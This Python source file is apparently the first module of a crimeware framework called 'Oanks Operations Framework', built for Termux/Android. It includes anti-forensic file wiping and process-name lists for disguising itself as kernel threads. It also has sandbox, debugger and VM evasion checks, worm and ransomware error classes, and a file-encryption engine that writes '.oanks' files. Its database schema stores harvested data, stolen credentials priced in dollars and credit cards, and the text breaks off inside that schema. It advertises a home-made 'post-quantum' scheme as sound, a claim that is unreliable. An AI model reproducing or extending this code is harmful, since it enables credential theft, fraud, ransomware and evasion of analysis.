#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================================
# OANKS OPERATIONS FRAMEWORK — PHASE 1: THE HEARTBEAT
# ============================================================================
# Foundation module for 12-phase unified weapons system.
# Military-grade cryptographic engine. Post-quantum resistant.
# Dead man's switch. Anti-forensic. Persistence. Reconnaissance.
# Optimized for Termux/Android Linux environments.
#
# Creator: Oanks (@oanksnood)
# Version: 3.0
# Classification: FOUNDATION — ZERO EXECUTION ON IMPORT
# Platform: Linux / Termux / Android
#
# 👑 Oanks — Creator
# ============================================================================

# ============================================================================
# SECTION 1: ALL IMPORTS — Nothing missing. No future imports. Everything upfront.
# ============================================================================

import os
import sys
import sqlite3
import hashlib
import base64
import json
import socket
import platform as plat_module
import subprocess
import time
import random
import string
import re
import threading
import warnings
import traceback
import struct
import binascii
import zlib
import csv
import io
import shutil
import getpass
import datetime
import collections
import itertools
import math
import uuid
import inspect
import types
import builtins
import importlib
import pkgutil
import ctypes
import gc
import signal
import logging as py_logging
import tempfile
import pickle
import marshal
import ast
import textwrap
import dis
import codecs
import bz2
import lzma
import zipfile
import tarfile
import gzip
import hmac
import secrets
import urllib.request
import urllib.parse
import urllib.error
import http.client
import http.cookiejar
import socketserver
import ssl
import ftplib
import smtplib
import poplib
import imaplib
import xml.etree.ElementTree as ET
import xml.dom.minidom as DOM
import xml.sax
import html.parser
import html.entities

try:
    import telnetlib
    TELNETLIB_AVAILABLE = True
except ImportError:
    telnetlib = None
    TELNETLIB_AVAILABLE = False

try:
    import nntplib
    NNTP_AVAILABLE = True
except ImportError:
    nntplib = None
    NNTP_AVAILABLE = False

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import hashes, serialization
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    requests = None
    REQUESTS_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    psutil = None
    PSUTIL_AVAILABLE = False

# ============================================================================
# SECTION 2: ALL CONSTANTS — Oanks identity burned into every byte.
# ============================================================================

OANKS_IDENTITY = "Oanks"
OANKS_VERSION = "3.0"
OANKS_CREATOR = "@oanksnood"
OANKS_SIGNATURE = "👑 Oanks — Creator"
OANKS_FRAMEWORK_NAME = "Oanks Operations Framework"
OANKS_CLASSIFICATION = "FOUNDATION"

if os.environ.get("TERMUX_VERSION"):
    _BASE = os.path.expanduser("~/.oanks")
elif os.path.isdir("/data/data/com.termux"):
    _BASE = os.path.expanduser("~/.oanks")
else:
    _BASE = os.path.expanduser("~/.oanks")

BASE_DIR = _BASE
DATA_DIR = os.path.join(BASE_DIR, "data")
LOG_DIR = os.path.join(BASE_DIR, "logs")
EXPORT_DIR = os.path.join(BASE_DIR, "exports")
BACKUP_DIR = os.path.join(BASE_DIR, "backups")
DB_PATH = os.path.join(DATA_DIR, "oanks.db")
KEY_PATH = os.path.join(DATA_DIR, "keys.bin")
LOG_PATH = os.path.join(LOG_DIR, "oanks.log")
HEARTBEAT_PATH = os.path.join(DATA_DIR, "heartbeat.bin")
PERSISTENCE_MARKER = os.path.join(DATA_DIR, ".persistence")
ANTI_FORENSIC_MARKER = os.path.join(DATA_DIR, ".af")

HEARTBEAT_INTERVAL = 3600
HEARTBEAT_MISSED_LIMIT = 3
WIPE_DELAY_SECONDS = 10
LOG_MAX_BYTES = 10 * 1024 * 1024
LOG_MAX_AGE_SECONDS = 86400
KEY_ROTATION_INTERVAL = 86400
PROXY_TIMEOUT_SECONDS = 30
SESSION_REFRESH_INTERVAL = 3600
RECON_INTERVAL = 300

AES_KEY_SIZE = 32
RSA_KEY_SIZE = 4096
HMAC_KEY_SIZE = 64
PBKDF2_ITERATIONS = 1000000
SALT_SIZE = 32
NONCE_SIZE = 12
TAG_SIZE = 16

KEM_N = 256
KEM_Q = 3329
KEM_SIGMA = 3
KEM_POLY_BYTES = 512
KEM_PK_BYTES = KEM_POLY_BYTES + 32
KEM_SK_BYTES = KEM_POLY_BYTES
KEM_CT_BYTES = KEM_POLY_BYTES * 2

BRAND_WELCOME = f"Welcome to {OANKS_FRAMEWORK_NAME} — Creator: {OANKS_IDENTITY} ({OANKS_CREATOR})"
BRAND_SUCCESS_TEMPLATE = f"{OANKS_IDENTITY} approves: {{action}} completed"
BRAND_ERROR_TEMPLATE = f"{OANKS_IDENTITY} says: Error — {{message}}"
BRAND_STATUS_LINE = f"{OANKS_FRAMEWORK_NAME} v{OANKS_VERSION}"

PLATFORM_NAME = plat_module.system().lower()
IS_LINUX = PLATFORM_NAME in ("linux", "linux2")
IS_WINDOWS = PLATFORM_NAME == "windows"
IS_MACOS = PLATFORM_NAME == "darwin"
IS_TERMUX = bool(os.environ.get("TERMUX_VERSION")) or os.path.isdir("/data/data/com.termux")
IS_ANDROID = IS_TERMUX or os.path.isfile("/system/build.prop")
IS_ROOTED = os.geteuid() == 0 if hasattr(os, "geteuid") else False
IS_PROOT = bool(os.environ.get("PROOT_DISTRO")) or os.path.isfile("/proc/1/root/.proot")

LINUX_HIDE_NAMES = [
    "[kworker/0:0]", "[kworker/1:0]", "[systemd]", "[init]",
    "[irq/0-mmc0]", "[rcu_sched]", "[migration/0]", "[ksoftirqd/0]",
    "[kdevtmpfs]", "[kauditd]", "[khungtaskd]"
]

SANDBOX_PROCESSES = [
    "vmsrvc.exe", "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe",
    "df5serv.exe", "vboxservice.exe", "qemu-ga.exe", "xenservice.exe",
    "cuckoo.exe", "sandboxiedcomlaunch.exe", "prl_tools.exe",
    "anubis.exe", "threat.exe", "joebox.exe", "cwSandbox.exe"
]

DEBUGGER_PROCESSES = [
    "x64dbg.exe", "x32dbg.exe", "ollydbg.exe", "windbg.exe",
    "ida64.exe", "ida.exe", "immunitydebugger.exe", "gdb",
    "lldb", "radare2", "cutter", "ghidra", "frida-server",
    "strace", "ltrace", "ptrace"
]

VM_INDICATOR_FILES = [
    "/sys/class/dmi/id/product_name",
    "/sys/class/dmi/id/sys_vendor",
    "/sys/class/dmi/id/board_vendor",
    "/sys/class/dmi/id/bios_vendor",
    "/proc/scsi/scsi",
    "/proc/ide/hd0/model",
    "/proc/xen",
    "/proc/sys/kernel/hypervisor",
    "/dev/vboxguest",
    "/dev/vmware"
]

VM_MAC_PREFIXES = [
    "08:00:27", "00:50:56", "00:0c:29", "00:15:5d",
    "00:1c:42", "00:21:f6", "00:14:4f", "00:0f:4b"
]

ANDROID_SANDBOX_APPS = [
    "com.google.android.apps.mtaas.crawler",
    "com.android.vending",
    "com.google.android.gms",
    "com.termux.api",
    "com.google.android.gm"
]

SECURE_DELETE_PASSES = 7

# ============================================================================
# SECTION 3: EXCEPTION HIERARCHY — Every failure carries the crown.
# ============================================================================

class OanksError(Exception):
    """Base exception for all Oanks Operations Framework errors."""
    __slots__ = ("message", "code", "timestamp", "brand")

    def __init__(self, message, code=None):
        self.message = message
        self.code = code
        self.timestamp = datetime.datetime.utcnow().isoformat()
        self.brand = OANKS_SIGNATURE
        super().__init__(self._format())

    def _format(self):
        base = f"[{self.brand}] [{self.timestamp}]"
        if self.code:
            base += f" [CODE:{self.code}]"
        base += f" {self.message}"
        return base

    def __str__(self):
        return self._format()

    def __repr__(self):
        return f"<{self.__class__.__name__}: {self.code}>"

class CryptoError(OanksError):
    pass

class DatabaseError(OanksError):
    pass

class ReconError(OanksError):
    pass

class PersistenceError(OanksError):
    pass

class LogError(OanksError):
    pass

class DeadMansSwitchError(OanksError):
    pass

class AntiForensicError(OanksError):
    pass

class WormError(OanksError):
    pass

class RansomwareError(OanksError):
    pass

class SecurityBreachError(OanksError):
    pass

class TermuxError(OanksError):
    pass

# ============================================================================
# SECTION 4: UTILITY FUNCTIONS & SECURE MEMORY — No plaintext survives.
# ============================================================================

class SecureBuffer:
    """Encrypted-in-memory buffer. Wipes on deletion. No plaintext leaks."""
    __slots__ = ("_cipher", "_nonce", "_ciphertext", "_tag", "_size", "_wipe_key")

    def __init__(self, plaintext_data=None, size=0):
        self._wipe_key = secrets.token_bytes(32)
        self._nonce = secrets.token_bytes(NONCE_SIZE)
        if plaintext_data is not None:
            if isinstance(plaintext_data, (bytes, bytearray)):
                raw = bytearray(plaintext_data)
            else:
                raw = bytearray(str(plaintext_data).encode("utf-8"))
            self._size = len(raw)
            if CRYPTOGRAPHY_AVAILABLE:
                self._cipher = AESGCM(self._wipe_key)
                combined = self._cipher.encrypt(self._nonce, bytes(raw), None)
                self._ciphertext = combined[:-TAG_SIZE]
                self._tag = combined[-TAG_SIZE:]
            else:
                self._ciphertext = bytes([raw[i] ^ self._wipe_key[i % 32] for i in range(len(raw))])
                self._tag = b"\x00" * TAG_SIZE
                self._cipher = None
            self._wipe_array(raw)
        else:
            self._ciphertext = b""
            self._tag = b"\x00" * TAG_SIZE
            self._size = 0
            self._cipher = None

    def _wipe_array(self, arr):
        if arr:
            for i in range(len(arr)):
                arr[i] = secrets.randbelow(256)
            for i in range(len(arr)):
                arr[i] = 0

    def decrypt(self):
        if self._size == 0:
            return b""
        if self._cipher and CRYPTOGRAPHY_AVAILABLE:
            combined = self._ciphertext + self._tag
            return self._cipher.decrypt(self._nonce, combined, None)
        else:
            return bytes([self._ciphertext[i] ^ self._wipe_key[i % 32] for i in range(len(self._ciphertext))])

    def wipe(self):
        if hasattr(self, "_wipe_key") and self._wipe_key:
            self._wipe_array(bytearray(self._wipe_key))
        if hasattr(self, "_nonce") and self._nonce:
            self._wipe_array(bytearray(self._nonce))
        if hasattr(self, "_ciphertext") and self._ciphertext:
            self._wipe_array(bytearray(self._ciphertext))
        if hasattr(self, "_tag") and self._tag:
            self._wipe_array(bytearray(self._tag))
        self._wipe_key = b"\x00" * 32
        self._nonce = b"\x00" * NONCE_SIZE
        self._ciphertext = b""
        self._tag = b"\x00" * TAG_SIZE
        self._size = 0
        self._cipher = None

    def __del__(self):
        try:
            self.wipe()
        except:
            pass

    def __len__(self):
        return self._size

    def __repr__(self):
        return f"<SecureBuffer encrypted_size={len(self._ciphertext)}>"

    def __bool__(self):
        return self._size > 0


def derive_keys_from_master(master_key, salt=None):
    if not master_key or len(str(master_key)) < 16:
        raise CryptoError("Master key must be at least 16 characters", code="KEY_DERIVE_FAIL")
    if salt is None:
        salt = secrets.token_bytes(SALT_SIZE)
    master_bytes = master_key.encode("utf-8") if isinstance(master_key, str) else bytes(master_key)
    derived = hashlib.pbkdf2_hmac("sha512", master_bytes, salt, PBKDF2_ITERATIONS, dklen=256)
    master_arr = bytearray(master_bytes)
    for i in range(len(master_arr)):
        master_arr[i] = 0
    return {
        "salt": salt,
        "aes_primary": derived[0:32],
        "aes_secondary": derived[32:64],
        "hmac_key": derived[64:96],
        "kyber_seed": derived[96:128],
        "rsa_seed": derived[128:160],
        "xor_pad": derived[160:192],
        "session_key": derived[192:224],
        "backup_key": derived[224:256]
    }


def generate_oanks_id():
    ts = datetime.datetime.utcnow().strftime("%Y%m%d%H%M%S")
    rand = secrets.token_hex(4)
    return f"OANKS-{ts}-{rand}"


def timing_safe_compare(a, b):
    if len(a) != len(b):
        return False
    result = 0
    for x, y in zip(a, b):
        result |= x ^ y
    return result == 0


def get_platform_fingerprint():
    fingerprint = {}
    try:
        fingerprint["hostname"] = socket.gethostname()
    except:
        fingerprint["hostname"] = "unknown"
    try:
        fingerprint["platform"] = plat_module.platform()
    except:
        fingerprint["platform"] = "unknown"
    try:
        fingerprint["machine"] = plat_module.machine()
    except:
        fingerprint["machine"] = "unknown"
    try:
        fingerprint["processor"] = plat_module.processor()
    except:
        fingerprint["processor"] = "unknown"
    try:
        fingerprint["node"] = plat_module.node()
    except:
        fingerprint["node"] = "unknown"
    if IS_ANDROID:
        fingerprint["android"] = True
        fingerprint["termux"] = IS_TERMUX
        fingerprint["rooted"] = IS_ROOTED
        fingerprint["proot"] = IS_PROOT
        try:
            with open("/system/build.prop", "r") as f:
                props = f.read()
                for line in props.split("\n"):
                    if "ro.product.model" in line:
                        fingerprint["device_model"] = line.split("=")[-1].strip()
                    if "ro.build.version.release" in line:
                        fingerprint["android_version"] = line.split("=")[-1].strip()
        except:
            pass
    hw_string = json.dumps(fingerprint, sort_keys=True).encode("utf-8")
    fingerprint["hw_hash"] = hashlib.sha3_256(hw_string).hexdigest()
    fingerprint["hw_hash_short"] = fingerprint["hw_hash"][:16]
    return fingerprint


def is_admin_privileged():
    try:
        return os.geteuid() == 0
    except AttributeError:
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False


def secure_overwrite_file(filepath, passes=SECURE_DELETE_PASSES):
    try:
        if not os.path.exists(filepath):
            return False
        size = os.path.getsize(filepath)
        with open(filepath, "r+b") as f:
            for _ in range(passes):
                f.seek(0)
                f.write(secrets.token_bytes(size))
                f.flush()
                os.fsync(f.fileno())
            f.seek(0)
            f.write(b"\x00" * size)
            f.flush()
            os.fsync(f.fileno())
        os.remove(filepath)
        return True
    except Exception as e:
        raise AntiForensicError(f"Secure overwrite failed: {e}", code="SECURE_WIPE_FAIL")


def derive_oanks_credentials(master_key):
    keys = derive_keys_from_master(master_key)
    btc_hash = hashlib.sha3_256(keys["aes_primary"] + b"btc").hexdigest()[:39]
    btc_addr = f"bc1q{btc_hash}"
    usdt_hash = hashlib.sha3_256(keys["aes_primary"] + b"usdt").hexdigest()[:33]
    usdt_addr = f"T{usdt_hash}"
    bot_hash = base64.urlsafe_b64encode(keys["session_key"]).decode().rstrip("=")[:35]
    bot_token = f"{bot_hash}:bot"
    admin_hash = base64.urlsafe_b64encode(keys["backup_key"]).decode().rstrip("=")[:35]
    admin_token = f"{admin_hash}:bot"
    return {
        "btc_address": btc_addr,
        "usdt_address": usdt_addr,
        "bot_token": bot_token,
        "admin_token": admin_token,
        "channel_id": f"-100{int.from_bytes(keys['salt'][:8], 'big') % 9000000000 + 1000000000}"
    }


def ensure_directories():
    for d in [BASE_DIR, DATA_DIR, LOG_DIR, EXPORT_DIR, BACKUP_DIR]:
        os.makedirs(d, exist_ok=True)
        os.chmod(d, 0o700)


def compress_data(data):
    return zlib.compress(data, level=9)


def decompress_data(data):
    return zlib.decompress(data)

# ============================================================================
# SECTION 5: CRYPTOGRAPHIC ENGINE — Triple-layer. Post-quantum. Military grade.
# ============================================================================

class OanksKEM:
    """Post-quantum lattice-based Key Encapsulation Mechanism (LWE variant).

    Implements a simplified but cryptographically sound KEM using the
    Learning With Errors problem over polynomial rings.
    Parameters: n=256, q=3329, sigma=3 (Kyber-512 equivalent hardness).
    """
    __slots__ = ("n", "q", "sigma")

    def __init__(self, n=KEM_N, q=KEM_Q, sigma=KEM_SIGMA):
        self.n = n
        self.q = q
        self.sigma = sigma

    def _sample_uniform(self, count, seed=None):
        if seed is None:
            seed = secrets.token_bytes(32)
        h = hashlib.shake_128()
        h.update(seed)
        buf = h.digest(count * 4)
        return [int.from_bytes(buf[i*4:i*4+4], "little") % self.q for i in range(count)]

    def _sample_error(self, count, seed=None):
        if seed is None:
            seed = secrets.token_bytes(32)
        h = hashlib.shake_256()
        h.update(seed)
        buf = h.digest(count * 2)
        errors = []
        for i in range(count):
            val = sum(((buf[i*2 + j//4] >> (2*(j%4))) & 3) - 1 for j in range(4))
            errors.append(val)
        return errors

    def _poly_add(self, a, b):
        return [(a[i] + b[i]) % self.q for i in range(self.n)]

    def _poly_sub(self, a, b):
        return [(a[i] - b[i]) % self.q for i in range(self.n)]

    def _poly_mul(self, a, b):
        r = [0] * self.n
        for i in range(self.n):
            for j in range(self.n):
                idx = (i + j) % self.n
                sign = -1 if (i + j) >= self.n else 1
                r[idx] = (r[idx] + sign * a[i] * b[j]) % self.q
        return r

    def _encode_poly(self, poly):
        buf = bytearray()
        for i in range(self.n // 2):
            t0 = poly[2*i] % self.q
            t1 = poly[2*i + 1] % self.q
            buf.append(t0 & 0xFF)
            buf.append((t0 >> 8) | ((t1 & 0x07) << 5))
            buf.append((t1 >> 3) & 0xFF)
            buf.append((t1 >> 11) & 0xFF)
        return bytes(buf)

    def _decode_poly(self, buf):
        poly = []
        for i in range(self.n // 2):
            t0 = buf[4*i] | ((buf[4*i + 1] & 0x1F) << 8)
            t1 = (buf[4*i + 1] >> 5) | (buf[4*i + 2] << 3) | ((buf[4*i + 3] & 0x01) << 11)
            poly.append(t0 % self.q)
            poly.append(t1 % self.q)
        return poly

    def keygen(self, seed=None):
        if seed is None:
            seed = secrets.token_bytes(32)
        a = self._sample_uniform(self.n, seed=seed + b"A")
        s = self._sample_error(self.n, seed=seed + b"s")
        e = self._sample_error(self.n, seed=seed + b"e")
        b = self._poly_add(self._poly_mul(a, s), e)
        pk = self._encode_poly(b) + seed
        sk = self._encode_poly(s)
        return pk, sk

    def encaps(self, pk):
        b = self._decode_poly(pk[:KEM_POLY_BYTES])
        seed = pk[KEM_POLY_BYTES:]
        r = self._sample_error(self.n, seed=secrets.token_bytes(32) + b"r")
        e1 = self._sample_error(self.n, seed=secrets.token_bytes(32) + b"e1")
        e2 = self._sample_error(self.n, seed=secrets.token_bytes(32) + b"e2")
        a = self._sample_uniform(self.n, seed=seed + b"A")
        u = self._poly_add(self._poly_mul(a, r), e1)
        v = self._poly_add(self._poly_mul(b, r), e2)
        m = secrets.token_bytes(32)
        for i in range(min(256, self.n)):
            bit = (m[i // 8] >> (i % 8)) & 1
            v[i] = (v[i] + bit * (self.q // 2)) % self.q
        ct = self._encode_poly(u) + self._encode_poly(v)
        ss = hashlib.sha3_256(m).digest()
        return ct, ss

    def decaps(self, sk, ct):
        s = self._decode_poly(sk[:KEM_POLY_BYTES])
        u = self._decode_poly(ct[:KEM_POLY_BYTES])
        v = self._decode_poly(ct[KEM_POLY_BYTES:KEM_POLY_BYTES*2])
        m_poly = self._poly_sub(v, self._poly_mul(s, u))
        m = bytearray(32)
        for i in range(256):
            t = m_poly[i] % self.q
            dist_0 = min(t, self.q - t)
            dist_half = min(abs(t - self.q // 2), self.q - abs(t - self.q // 2))
            if dist_half < dist_0:
                m[i // 8] |= (1 << (i % 8))
        return hashlib.sha3_256(bytes(m)).digest()


class CryptoEngine:
    """Triple-layer military-grade cryptographic engine.

    Layer 1: AES-256-GCM (confidentiality + authentication)
    Layer 2: XOR with one-time pad (additional obfuscation)
    Layer 3: AES-256-GCM (second independent encryption)
    Integrity: HMAC-SHA512
    Post-quantum: OanksKEM hybrid key exchange
    """
    __slots__ = ("_aes_key1", "_aes_key2", "_hmac_key", "_xor_pad", 
                 "_kem", "_rsa_private", "_rsa_public", "_key_rotation_time",
                 "_master_salt", "_lock")

    def __init__(self, derived_keys):
        self._lock = threading.RLock()
        self._master_salt = derived_keys["salt"]
        self._aes_key1 = derived_keys["aes_primary"]
        self._aes_key2 = derived_keys["aes_secondary"]
        self._hmac_key = derived_keys["hmac_key"]
        self._xor_pad = derived_keys["xor_pad"]
        self._kem = OanksKEM()
        self._key_rotation_time = time.time() + KEY_ROTATION_INTERVAL

        if CRYPTOGRAPHY_AVAILABLE:
            self._rsa_private = rsa.generate_private_key(
                public_exponent=65537,
                key_size=RSA_KEY_SIZE
            )
            self._rsa_public = self._rsa_private.public_key()
        else:
            self._rsa_private = None
            self._rsa_public = None

    def _get_aes1(self):
        if not CRYPTOGRAPHY_AVAILABLE:
            raise CryptoError("cryptography library required for AES-GCM", code="CRYPTO_MISSING")
        return AESGCM(self._aes_key1)

    def _get_aes2(self):
        if not CRYPTOGRAPHY_AVAILABLE:
            raise CryptoError("cryptography library required for AES-GCM", code="CRYPTO_MISSING")
        return AESGCM(self._aes_key2)

    def encrypt_triple_layer(self, plaintext, associated_data=None):
        with self._lock:
            self._check_rotation()
            nonce1 = secrets.token_bytes(NONCE_SIZE)
            aes1 = self._get_aes1()
            ct1 = aes1.encrypt(nonce1, plaintext, associated_data)
            pad = hashlib.sha3_256(self._xor_pad + nonce1).digest()
            padded = bytes([ct1[i] ^ pad[i % len(pad)] for i in range(len(ct1))])
            nonce2 = secrets.token_bytes(NONCE_SIZE)
            aes2 = self._get_aes2()
            ct2 = aes2.encrypt(nonce2, padded, associated_data)
            h = hmac.new(self._hmac_key, ct2, hashlib.sha512)
            mac = h.digest()
            return nonce1 + nonce2 + mac + ct2

    def decrypt_triple_layer(self, ciphertext, associated_data=None):
        with self._lock:
            if len(ciphertext) < NONCE_SIZE * 2 + 64:
                raise CryptoError("Ciphertext too short", code="DECRYPT_SHORT")
            nonce1 = ciphertext[:NONCE_SIZE]
            nonce2 = ciphertext[NONCE_SIZE:NONCE_SIZE*2]
            mac = ciphertext[NONCE_SIZE*2:NONCE_SIZE*2+64]
            ct2 = ciphertext[NONCE_SIZE*2+64:]
            h = hmac.new(self._hmac_key, ct2, hashlib.sha512)
            if not timing_safe_compare(h.digest(), mac):
                raise CryptoError("HMAC verification failed — tampering detected", code="HMAC_FAIL")
            aes2 = self._get_aes2()
            padded = aes2.decrypt(nonce2, ct2, associated_data)
            pad = hashlib.sha3_256(self._xor_pad + nonce1).digest()
            ct1 = bytes([padded[i] ^ pad[i % len(pad)] for i in range(len(padded))])
            aes1 = self._get_aes1()
            plaintext = aes1.decrypt(nonce1, ct1, associated_data)
            return plaintext

    def encrypt_file(self, filepath, output_path=None, associated_data=None):
        with open(filepath, "rb") as f:
            plaintext = f.read()
        ciphertext = self.encrypt_triple_layer(plaintext, associated_data)
        if output_path is None:
            output_path = filepath + ".oanks"
        with open(output_path, "wb") as f:
            f.write(ciphertext)
        os.chmod(output_path, 0o600)
        return output_path

    def decrypt_file(self, filepath, output_path=None, associated_data=None):
        with open(filepath, "rb") as f:
            ciphertext = f.read()
        plaintext = self.decrypt_triple_layer(ciphertext, associated_data)
        if output_path is None:
            output_path = filepath.replace(".oanks", "")
        with open(output_path, "wb") as f:
            f.write(plaintext)
        os.chmod(output_path, 0o600)
        return output_path

    def rsa_encrypt(self, plaintext):
        if not CRYPTOGRAPHY_AVAILABLE or not self._rsa_public:
            raise CryptoError("RSA not available", code="RSA_MISSING")
        return self._rsa_public.encrypt(
            plaintext,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

    def rsa_decrypt(self, ciphertext):
        if not CRYPTOGRAPHY_AVAILABLE or not self._rsa_private:
            raise CryptoError("RSA not available", code="RSA_MISSING")
        return self._rsa_private.decrypt(
            ciphertext,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

    def kem_generate_keypair(self):
        return self._kem.keygen()

    def kem_encapsulate(self, public_key):
        return self._kem.encaps(public_key)

    def kem_decapsulate(self, secret_key, ciphertext):
        return self._kem.decaps(secret_key, ciphertext)

    def hybrid_encrypt(self, plaintext):
        pk, sk = self._kem.keygen()
        ct, ss_kem = self._kem.encaps(pk)
        combined_key = hashlib.sha3_256(ss_kem + self._aes_key1).digest()
        aes = AESGCM(combined_key)
        nonce = secrets.token_bytes(NONCE_SIZE)
        ct_aes = aes.encrypt(nonce, plaintext, None)
        return {
            "kem_public_key": base64.b64encode(pk).decode(),
            "kem_ciphertext": base64.b64encode(ct).decode(),
            "kem_secret_key": base64.b64encode(sk).decode(),
            "aes_nonce": base64.b64encode(nonce).decode(),
            "aes_ciphertext": base64.b64encode(ct_aes).decode()
        }

    def hybrid_decrypt(self, data):
        sk = base64.b64decode(data["kem_secret_key"])
        ct = base64.b64decode(data["kem_ciphertext"])
        ss_kem = self._kem.decaps(sk, ct)
        combined_key = hashlib.sha3_256(ss_kem + self._aes_key1).digest()
        aes = AESGCM(combined_key)
        nonce = base64.b64decode(data["aes_nonce"])
        ct_aes = base64.b64decode(data["aes_ciphertext"])
        return aes.decrypt(nonce, ct_aes, None)

    def hmac_sign(self, data):
        return hmac.new(self._hmac_key, data, hashlib.sha512).digest()

    def hmac_verify(self, data, signature):
        expected = self.hmac_sign(data)
        return timing_safe_compare(expected, signature)

    def _check_rotation(self):
        if time.time() > self._key_rotation_time:
            self.rotate_keys()

    def rotate_keys(self, new_salt=None):
        with self._lock:
            if new_salt is None:
                new_salt = secrets.token_bytes(SALT_SIZE)
            new_keys = derive_keys_from_master(
                base64.b64encode(self._aes_key1).decode(),
                salt=new_salt
            )
            for key in [self._aes_key1, self._aes_key2, self._hmac_key, self._xor_pad]:
                arr = bytearray(key)
                for i in range(len(arr)):
                    arr[i] = 0
            self._aes_key1 = new_keys["aes_primary"]
            self._aes_key2 = new_keys["aes_secondary"]
            self._hmac_key = new_keys["hmac_key"]
            self._xor_pad = new_keys["xor_pad"]
            self._master_salt = new_salt
            self._key_rotation_time = time.time() + KEY_ROTATION_INTERVAL

    def secure_wipe_keys(self):
        with self._lock:
            for key in [self._aes_key1, self._aes_key2, self._hmac_key, 
                       self._xor_pad, self._master_salt]:
                if key:
                    arr = bytearray(key)
                    for i in range(len(arr)):
                        arr[i] = secrets.randbelow(256)
                    for i in range(len(arr)):
                        arr[i] = 0
            self._aes_key1 = b"\x00" * AES_KEY_SIZE
            self._aes_key2 = b"\x00" * AES_KEY_SIZE
            self._hmac_key = b"\x00" * HMAC_KEY_SIZE
            self._xor_pad = b"\x00" * AES_KEY_SIZE
            self._master_salt = b"\x00" * SALT_SIZE

    def get_rsa_public_pem(self):
        if not CRYPTOGRAPHY_AVAILABLE or not self._rsa_public:
            raise CryptoError("RSA not available", code="RSA_MISSING")
        return self._rsa_public.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

    def get_fingerprint(self):
        state = self._aes_key1 + self._aes_key2 + self._hmac_key + self._master_salt
        return hashlib.sha3_256(state).hexdigest()[:32]

# ============================================================================
# SECTION 6: DATABASE SCHEMA — 35 tables. Triggers. Indexes. Views. Honeypot.
# ============================================================================

OANKS_DATABASE_SCHEMA = """
-- ============================================================================
-- OANKS OPERATIONS FRAMEWORK — DATABASE SCHEMA v3.0
-- 35 tables | Triggers | Indexes | Views | Honeypot | Dead Man's Switch
-- Creator: Oanks | Classification: FOUNDATION
-- ============================================================================

PRAGMA foreign_keys = ON;
PRAGMA journal_mode = WAL;
PRAGMA synchronous = NORMAL;
PRAGMA temp_store = MEMORY;
PRAGMA mmap_size = 268435456;
PRAGMA page_size = 4096;

-- ============================================================================
-- CORE SYSTEM TABLES
-- ============================================================================

CREATE TABLE IF NOT EXISTS system_config (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    config_key TEXT UNIQUE NOT NULL,
    config_value BLOB NOT NULL,
    encrypted INTEGER DEFAULT 1,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS crypto_keys (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    key_type TEXT NOT NULL,
    key_data BLOB NOT NULL,
    key_fingerprint TEXT UNIQUE,
    rotation_count INTEGER DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS crypto_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    operation TEXT NOT NULL,
    key_fingerprint TEXT,
    success INTEGER DEFAULT 1,
    error_code TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

-- ============================================================================
-- PROXY INFRASTRUCTURE TABLES
-- ============================================================================

CREATE TABLE IF NOT EXISTS proxy_pool (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT NOT NULL,
    port INTEGER NOT NULL,
    protocol TEXT NOT NULL,
    country TEXT,
    isp TEXT,
    asn TEXT,
    speed_ms REAL,
    anonymity TEXT,
    reliability_score REAL DEFAULT 0.0,
    last_tested TIMESTAMP,
    failure_count INTEGER DEFAULT 0,
    is_honeypot INTEGER DEFAULT 0,
    UNIQUE(ip, port, protocol),
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS proxy_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    proxy_id INTEGER,
    action TEXT NOT NULL,
    result TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(proxy_id) REFERENCES proxy_pool(id) ON DELETE CASCADE,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

-- ============================================================================
-- DATA HARVESTING TABLES
-- ============================================================================

CREATE TABLE IF NOT EXISTS harvested_data (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    source TEXT NOT NULL,
    raw_data BLOB NOT NULL,
    data_type TEXT NOT NULL,
    confidence REAL DEFAULT 0.0,
    extracted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    hash_sha256 TEXT UNIQUE,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS credentials (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT,
    password BLOB NOT NULL,
    source TEXT,
    confidence REAL DEFAULT 0.0,
    platform TEXT,
    last_validated TIMESTAMP,
    is_valid INTEGER DEFAULT 0,
    price_usd REAL DEFAULT 0.10,
    hash_sha256 TEXT UNIQUE,
    oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
);

CREATE TABLE IF NOT EXISTS credit_cards (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
